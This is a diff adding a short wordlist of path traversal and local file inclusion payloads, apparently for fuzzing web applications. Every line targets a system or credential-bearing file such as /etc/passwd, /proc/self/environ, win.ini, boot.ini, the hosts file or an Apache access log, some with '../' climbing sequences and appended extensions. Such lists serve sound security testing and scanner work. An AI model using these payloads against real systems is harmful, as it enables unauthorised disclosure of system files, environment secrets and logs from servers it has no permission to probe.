@@ -1,0 +1,14 @@
+../../../../../../etc/passwd
+../../../../../../proc/self/environ
+../../../../../../windows/win.ini
+../../../../../../boot.ini
+../../../../../../system32/drivers/etc/hosts
+../../../../../../var/log/apache2/access
+etc/passwd
+proc/self/environ
+windows/win.ini
+boot.ini
+system32/drivers/etc/hosts
+etc/passwd.txt
+proc/self/environ.log
+windows/win.ini
